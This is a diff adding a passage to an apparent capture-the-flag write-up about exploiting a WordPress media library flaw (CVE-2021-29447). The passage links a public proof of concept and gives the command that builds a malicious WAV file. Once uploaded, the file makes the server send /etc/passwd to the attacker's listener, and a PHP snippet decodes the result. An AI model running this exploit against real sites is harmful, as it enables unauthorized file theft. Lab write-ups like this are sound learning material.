@@ -128,6 +128,40 @@ username:```manager```        password:```partylikearockstar```
 
 We are logged in
 
+Doing my research I found out that the media library for this wordpress version actually has a public exploit
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/92c04fdb-a55e-4d87-9230-43139f1b3fe0)
+
+You can download the exploit we'll be using from [here](https://github.com/0xRar/CVE-2021-29447-PoC)
+
+To run this exploit, you have to provide your lhost, the port you want to listen on and also the file you want to read
+
+command:```python PoC.py -l 10.10.14.153 -p 1234 -f /etc/passwd```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/964d438f-edad-4b37-9fc9-9c91709c67c0)
+
+A ```payload.wav``` file was created in the same directory as the exploit when we ran it. So, what we'll do is upload the ```payload.wav``` fike, doing that should give us something on our listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e166931-6e9b-4c90-ba59-f75a6a4a0572)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/548de113-b78c-4f4f-ae8b-09f939d794ec)
+
+Checking our terminal
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/81b7b032-cd89-47cf-8c2f-ad4f833fb4fc)
+
+We got something that looks like base4, we can decode that using the php script below
+
+```php
+<?php
+echo zlib_decode(base64_decode('base64_here'));
+?>
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cee5b0e3-f8fd-4ec9-866d-f19b1e6c3267)
+
+nice nice, we were able to read the ```/etc/passwd``` file
+
+
 
 
 
